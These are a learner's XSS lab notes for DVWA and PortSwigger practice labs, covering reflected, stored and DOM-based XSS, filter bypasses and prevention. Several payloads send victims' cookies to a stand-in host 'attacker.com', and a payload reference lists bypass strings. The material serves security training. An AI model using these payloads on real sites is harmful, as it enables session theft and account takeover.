# XSS Lab Notes — DVWA + PortSwigger

**Author:** Nivedhitha KS | **Day:** 15 of 60  
**GitHub:** github.com/NivedhithaKS-SEC/cybersec-journey

---

## What is Cross-Site Scripting (XSS)?

XSS is a web vulnerability where an attacker injects malicious JavaScript into a webpage that is then executed in the victim's browser. The server trusts and returns the attacker's input as part of its HTML response.

**Key point:** XSS attacks the *user's browser*, not the server itself.

### Impact of XSS
- Steal session cookies → account takeover without knowing password
- Redirect users to phishing pages
- Log keystrokes
- Take screenshots via browser APIs
- Deface websites
- Deliver malware

---

## Three Types of XSS

| Type | Where payload lives | Who gets affected | Persistence |
|------|--------------------|--------------------|------------|
| **Reflected** | URL / request parameter | Only users who click crafted link | No |
| **Stored** | Database / server storage | Every visitor to that page | Yes |
| **DOM-based** | Client-side JavaScript | Users visiting crafted URL | No |

---

## Part 1 — DVWA Labs

### Setup
```bash
# Start services on Kali
sudo service apache2 start
sudo service mysql start

# Open browser
http://localhost/dvwa

# Login credentials
Username: admin
Password: password

# Set security level
DVWA Security → Low → Submit
```

---

### Lab 1 — Reflected XSS (Low Security)

**Location:** DVWA → XSS (Reflected)

**What the page does:** Takes a name input and reflects it directly into the HTML response without sanitisation.

**Source code behaviour (Low):**
```php
// Vulnerable code:
echo '<pre>Hello ' . $_GET['name'] . '</pre>';
// No sanitisation — whatever you input goes directly into HTML
```

**Step-by-step testing:**

**Step 1 — Test normal input:**
```
Input: Nivedhitha
Output: Hello Nivedhitha
Observation: Input reflected as-is
```

**Step 2 — Test HTML injection:**
```
Input: <b>Nivedhitha</b>
Output: Hello Nivedhitha (text appears bold)
Observation: HTML tags are being rendered → HTML injection works
```

**Step 3 — Basic XSS:**
```
Input: <script>alert(1)</script>
Output: Alert box pops up saying "1"
Observation: JavaScript executes → XSS confirmed ✓
```

**Step 4 — Cookie theft simulation:**
```
Input: <script>alert(document.cookie)</script>
Output: Alert shows your session cookie value
Example: PHPSESSID=abc123def456; security=low
Observation: Attacker could send this to their server instead of alert()
```

**Step 5 — Full cookie exfil payload:**
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<!-- In a real attack, victim clicks crafted URL containing this payload -->
<!-- Attacker receives: GET /steal?c=PHPSESSID=abc123 in their server logs -->
```

**Step 6 — Alternative payloads:**
```html
<img src=x onerror=alert('XSS by Nivedhitha')>
<svg onload=alert(document.domain)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Screenshot to take:** Alert box with `document.cookie` value showing.

---

### Lab 2 — Reflected XSS (Medium Security)

**What changes:** The application strips `<script>` tags using `str_replace()`.

```php
// Medium security code:
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
// Only removes exactly "<script>" — case sensitive, single occurrence
```

**Bypass techniques:**

```html
<!-- Technique 1: Case variation -->
<Script>alert(1)</Script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

<!-- Technique 2: Nested tag (filter removes <script>, leaving inner one) -->
<sc<script>ript>alert(1)</sc</script>ript>
<!-- After filter removes <script>: <script>alert(1)</script> -->

<!-- Technique 3: Event handler (no script tag needed) -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

<!-- Technique 4: JavaScript URI -->
<a href="javascript:alert(1)">Click me</a>
```

---

### Lab 3 — Reflected XSS (High Security)

**What changes:** Uses regex to strip script tags more aggressively.
```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
```

**Bypass:** The regex only targets the word "script" — use non-script event handlers:
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

---

### Lab 4 — Stored XSS (Low Security)

**Location:** DVWA → XSS (Stored)

**What the page does:** A guestbook. Entries are saved to the database and displayed to every visitor.

**Why stored XSS is more dangerous:**
- Reflected: Victim must click your crafted URL
- Stored: Payload fires automatically for EVERY visitor — no social engineering needed

**Step-by-step:**

**Step 1 — Normal submission:**
```
Name: Nivedhitha
Message: Hello World
Result: Entry saved and displayed on page
```

**Step 2 — Test HTML in Message field:**
```
Name: Test
Message: <b>Bold text</b>
Result: Does text appear bold? If yes → HTML injection works
```

**Step 3 — Basic stored XSS:**
```
Name: Attacker
Message: <script>alert('Stored XSS!')</script>
Result: Submit → refresh page → alert fires for EVERY user who visits
```

**Step 4 — Persistent cookie stealer:**
```html
<!-- In Message field: -->
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
<!-- Every visitor's cookie is silently sent to attacker.com -->
```

**Step 5 — Page defacement payload:**
```html
<script>document.body.innerHTML = '<h1>Hacked by Nivedhitha</h1>'</script>
```

**Screenshot to take:** Alert box firing when you reload the guestbook page.

---

### Lab 5 — DOM-Based XSS (Low Security)

**Location:** DVWA → XSS (DOM)

**What makes DOM XSS different:**
The server is NOT involved. The vulnerability is in JavaScript that runs in the browser and reads from `location.href`, `document.URL`, `location.hash` without sanitisation.

```javascript
// Vulnerable JavaScript on the page:
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
// Input from URL goes directly into document.write() → DOM XSS
```

**Testing:**
```
Normal URL: http://localhost/dvwa/vulnerabilities/xss_d/?default=English

Malicious URL: http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>

Result: Alert fires — payload came from URL, processed by JS, written to DOM
Server never saw the payload
```

**URL-encoded version:**
```
?default=<script>alert(1)</script>
?default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

---

## Part 2 — PortSwigger XSS Labs

**URL:** `portswigger.net/web-security/cross-site-scripting`  
No VPN needed — all labs run in browser.

---

### PortSwigger Lab 1 — Reflected XSS into HTML context, nothing encoded

**Difficulty:** Apprentice (easiest)

**Goal:** Trigger `alert()` via reflected XSS in the search box.

**Steps:**
1. Go to the lab URL → click "Access the lab"
2. Find the search box on the page
3. Type: `<script>alert(1)</script>`
4. Click Search
5. Alert fires → "Congratulations, you solved the lab!" banner appears

**What you learned:** The search input is reflected directly into the HTML response with zero sanitisation. The browser executes it as JavaScript.

**Screenshot to take:** The green "Congratulations" banner.

---

### PortSwigger Lab 2 — Stored XSS into HTML context, nothing encoded

**Difficulty:** Apprentice

**Goal:** Trigger `alert()` via stored XSS in the blog comment section.

**Steps:**
1. Access the lab → click on any blog post
2. Scroll to comment section
3. In the Comment field type: `<script>alert(1)</script>`
4. Fill Name, Email (required fields) with anything valid
5. Post Comment
6. Navigate back to the blog post
7. Alert fires when page loads → lab solved

**Key observation:** After posting, the payload is stored in the database. Every page load — for every user — triggers the alert. This is the core danger of stored XSS.

**Screenshot to take:** Alert box + Congratulations banner.

---

### PortSwigger Lab 3 — DOM XSS in document.write sink using source location.search

**Difficulty:** Apprentice

**Goal:** Trigger `alert()` via DOM-based XSS in the search functionality.

**Background:** The page uses `document.write()` to write your search term into the DOM. The code creates an `<img>` tag with your search term as the `src` attribute:

```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
```

**Attack logic:** You need to break out of the `src` attribute and inject JavaScript:
```
Your input: "><svg onload=alert(1)>
```

This closes the `src` attribute (`"`), closes the `<img>` tag (`>`), then injects an SVG that executes JavaScript on load.

**Steps:**
1. Access the lab
2. In the search box type exactly: `"><svg onload=alert(1)>`
3. Click Search
4. Alert fires → lab solved

**What happens in the DOM:**
```html
<!-- Before your input: -->
<img src="/resources/images/tracker.gif?searchTerms=

<!-- After your input ("><svg onload=alert(1)>): -->
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">
```

**Screenshot to take:** Alert box + Congratulations banner.

---

## XSS Prevention Cheatsheet

| Prevention | How it works | Where to apply |
|------------|-------------|----------------|
| **Output encoding** | Convert `<` to `&lt;`, `>` to `&gt;` | Every output point |
| **Content Security Policy** | Whitelist allowed script sources | HTTP header |
| **HttpOnly cookies** | JavaScript cannot access `document.cookie` | Session cookies |
| **Input validation** | Reject unexpected characters at input | Server-side |
| **WAF rules** | Block known XSS patterns | Network layer |
| **X-XSS-Protection header** | Browser's built-in XSS filter | HTTP header |

**CSP example header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```
This prevents inline scripts from running — even if XSS is injected, the browser won't execute it.

---

## XSS Payload Reference

```html
<!-- Basic alert -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>

<!-- Cookie theft -->
<script>alert(document.cookie)</script>
<script>document.location='http://attacker.com?c='+document.cookie</script>
<img src=x onerror="document.location='http://attacker.com?c='+document.cookie">

<!-- Filter bypasses -->
<Script>alert(1)</Script>                    -- case variation
<img src=x onerror=alert(1)>                -- event handler
<svg onload=alert(1)>                        -- SVG event
<body onpageshow=alert(1)>                   -- body event
<details open ontoggle=alert(1)>             -- HTML5 event
javascript:alert(1)                          -- javascript URI
<a href="javascript:alert(1)">click</a>      -- anchor URI

<!-- Encoding bypasses -->
&lt;script&gt;alert(1)&lt;/script&gt;       -- HTML entities (won't execute)
\u003cscript\u003ealert(1)\u003c/script\u003e -- unicode
<script>eval(atob('YWxlcnQoMSk='))</script>  -- base64: alert(1)
```

---

## Lab Results Summary

| Lab | Platform | Type | Payload Used | Result |
|-----|----------|------|-------------|--------|
| Reflected XSS Low | DVWA | Reflected | `<script>alert(document.cookie)</script>` | ✅ |
| Reflected XSS Medium | DVWA | Reflected | `<img src=x onerror=alert(1)>` | ✅ |
| Stored XSS Low | DVWA | Stored | `<script>alert('Stored!')</script>` | ✅ |
| DOM XSS Low | DVWA | DOM | `<script>alert(1)</script>` in URL | ✅ |
| Lab 1 | PortSwigger | Reflected | `<script>alert(1)</script>` | ✅ |
| Lab 2 | PortSwigger | Stored | `<script>alert(1)</script>` | ✅ |
| Lab 3 | PortSwigger | DOM | `"><svg onload=alert(1)>` | ✅ |

*(Update checkboxes as you complete each lab)*

---

*Day 15 — 60-Day Cybersecurity Journey | github.com/NivedhithaKS-SEC/cybersec-journey*
